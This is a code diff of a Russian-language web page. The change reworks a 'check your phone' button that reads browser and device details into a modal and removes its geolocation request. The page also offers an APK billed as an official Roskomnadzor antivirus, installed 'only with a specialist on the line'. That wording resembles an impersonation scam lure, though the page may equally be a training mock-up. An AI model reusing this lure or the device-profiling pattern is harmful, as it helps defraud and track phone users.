@@ -384,6 +384,7 @@
       <h3>Приложение «Русский стандарт безопасности»</h3>
       <p>Официальный мобильный антивирус Роскомнадзора: сканирует приложения, предупреждает о фишинге, блокирует мошеннические сайты и контролирует передачу данных. Устанавливается только со специалистом на линии!</p>
       <a href="RusStandSafety.apk" download class="download-btn">Скачать приложение</a>
+      <button id="checkPhone" class="download-btn" style="margin-left:16px;">Проверить свой телефон</button>
     </section>
 
     <hr class="divider">
@@ -407,13 +408,6 @@
       </div>
     </section>
   </main>
-
-  <!-- Блок проверки телефона -->
-  <section class="block" style="text-align:center; margin-bottom:32px;">
-    <button id="checkPhone" class="download-btn">Проверить свой телефон</button>
-    <pre id="phoneInfo"
-         style="white-space: pre-wrap; background: #f0f0f0; padding:16px; margin-top:16px; text-align:left;"></pre>
-  </section>
 
   <!-- Футер -->
   <footer>
@@ -448,6 +442,31 @@
       </div>
     </div>
   </div>
+
+  <!-- Модалка: информация об устройстве -->
+<div id="phoneModal" class="modal">
+  <div class="modal-content">
+    <div class="modal-header">
+      <h2>Информация об устройстве</h2>
+      <button class="modal-close" onclick="closePhoneModal()">×</button>
+    </div>
+    <div class="modal-body">
+      <p><strong>User-Agent:</strong> <span id="pi-userAgent"></span></p>
+      <p><strong>Платформа:</strong> <span id="pi-platform"></span></p>
+      <p><strong>Вендор:</strong> <span id="pi-vendor"></span></p>
+      <p><strong>Язык:</strong> <span id="pi-language"></span></p>
+      <p><strong>Доступные языки:</strong> <span id="pi-languages"></span></p>
+      <p><strong>Память (GB):</strong> <span id="pi-memory"></span></p>
+      <p><strong>Ядер CPU:</strong> <span id="pi-cpu"></span></p>
+      <p><strong>Макс. касаний:</strong> <span id="pi-touch"></span></p>
+      <p><strong>Коэффициент пикселей:</strong> <span id="pi-pixelRatio"></span></p>
+      <p><strong>Экран (px):</strong> <span id="pi-screen"></span></p>
+      <p><strong>Окно просмотра (px):</strong> <span id="pi-viewport"></span></p>
+      <p><strong>Сеть:</strong> <span id="pi-connection"></span></p>
+      <p><strong>Батарея:</strong> <span id="pi-battery"></span></p>
+    </div>
+  </div>
+</div>
 
   <!-- Анкета безопасности -->
   <div id="security-survey" class="modal survey-hidden" role="dialog" aria-modal="true" aria-labelledby="surveyTitle">
@@ -608,86 +627,74 @@ function filterEmployees() {
   });
 }
 
-// Функция сбора информации об устройстве
+    // 1) Сбор информации без геолокации
 async function getPhoneInfo() {
+  const nav = navigator;
   const info = {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    vendor: navigator.vendor,
-    language: navigator.language,
-    languages: navigator.languages,
-    deviceMemory: navigator.deviceMemory || 'не поддерживается',
-    cpuCores: navigator.hardwareConcurrency || 'не поддерживается',
-    maxTouchPoints: navigator.maxTouchPoints || 0,
+    userAgent: nav.userAgent,
+    platform: nav.platform,
+    vendor: nav.vendor,
+    language: nav.language,
+    languages: nav.languages.join(', '),
+    deviceMemory: nav.deviceMemory ? nav.deviceMemory + ' GB' : 'не поддерживается',
+    cpuCores: nav.hardwareConcurrency || 'не поддерживается',
+    maxTouchPoints: nav.maxTouchPoints || 0,
     pixelRatio: window.devicePixelRatio,
-    screen: {
-      width: screen.width,
-      height: screen.height,
-      availWidth: screen.availWidth,
-      availHeight: screen.availHeight,
-    },
-    viewport: {
-      innerWidth: window.innerWidth,
-      innerHeight: window.innerHeight,
-    },
-    connection: navigator.connection
-      ? {
-          effectiveType: navigator.connection.effectiveType,
-          downlink: navigator.connection.downlink,
-          rtt: navigator.connection.rtt,
-        }
+    screen: `${screen.width}×${screen.height}`,
+    viewport: `${window.innerWidth}×${window.innerHeight}`,
+    connection: nav.connection
+      ? `${nav.connection.effectiveType}, downlink ${nav.connection.downlink}Mb/s, RTT ${nav.connection.rtt}ms`
       : 'не поддерживается',
-    battery: 'запрос…',
-    geolocation: 'не запрошено',
+    battery: 'запрос…'
   };
 
   // Battery API
-  if (navigator.getBattery) {
+  if (nav.getBattery) {
     try {
-      const bat = await navigator.getBattery();
-      info.battery = {
-        level: (bat.level * 100).toFixed(0) + '%',
-        charging: bat.charging,
-      };
+      const bat = await nav.getBattery();
+      info.battery = `${(bat.level*100).toFixed(0)}%` + (bat.charging ? ' (зарядка)' : '');
     } catch {
       info.battery = 'ошибка получения';
     }
   }
 
-  // Geolocation (требует разрешения)
-  if (navigator.geolocation) {
-    await new Promise(resolve => {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          info.geolocation = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy + ' м',
-          };
-          resolve();
-        },
-        () => {
-          info.geolocation = 'отказано в доступе или ошибка';
-          resolve();
-        }
-      );
-    });
-  }
-
   return info;
 }
 
-// Привязка к кнопке
-document.getElementById('checkPhone').addEventListener('click', async () => {
-  const pre = document.getElementById('phoneInfo');
-  pre.textContent = 'Сбор информации…';
-  try {
-    const info = await getPhoneInfo();
-    pre.textContent = JSON.stringify(info, null, 2);
-  } catch (err) {
-    pre.textContent = 'Ошибка при получении информации: ' + err;
-  }
-});
+// 2) Открыть и заполнить модалку
+async function openPhoneModal() {
+  const modal = document.getElementById('phoneModal');
+  document.body.classList.add('modal-open');
+  modal.classList.add('open');
+
+  const info = await getPhoneInfo();
+
+  document.getElementById('pi-userAgent').textContent = info.userAgent;
+  document.getElementById('pi-platform').textContent  = info.platform;
+  document.getElementById('pi-vendor').textContent    = info.vendor;
+  document.getElementById('pi-language').textContent  = info.language;
+  document.getElementById('pi-languages').textContent = info.languages;
+  document.getElementById('pi-memory').textContent    = info.deviceMemory;
+  document.getElementById('pi-cpu').textContent       = info.cpuCores;
+  document.getElementById('pi-touch').textContent     = info.maxTouchPoints;
+  document.getElementById('pi-pixelRatio').textContent = info.pixelRatio;
+  document.getElementById('pi-screen').textContent    = info.screen;
+  document.getElementById('pi-viewport').textContent  = info.viewport;
+  document.getElementById('pi-connection').textContent = info.connection;
+  document.getElementById('pi-battery').textContent   = info.battery;
+}
+
+// 3) Закрытие модалки
+function closePhoneModal() {
+  const modal = document.getElementById('phoneModal');
+  document.body.classList.remove('modal-open');
+  modal.classList.remove('open');
+}
+
+// 4) Привязка кнопки
+document.getElementById('checkPhone')
+  .addEventListener('click', openPhoneModal);
+    
 </script>
 </body>
 </html>
